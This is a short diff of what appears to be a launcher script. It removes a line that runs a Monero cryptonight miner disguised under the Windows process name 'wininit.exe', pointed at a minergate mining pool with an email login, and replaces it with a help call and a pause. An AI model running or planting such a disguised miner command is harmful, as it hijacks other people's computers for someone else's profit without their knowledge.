@@ -1,1 +1,2 @@
-wininit.exe -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u ztxslmso@abyssmail.com -p x -t1
+wininit.exe --help
+pause
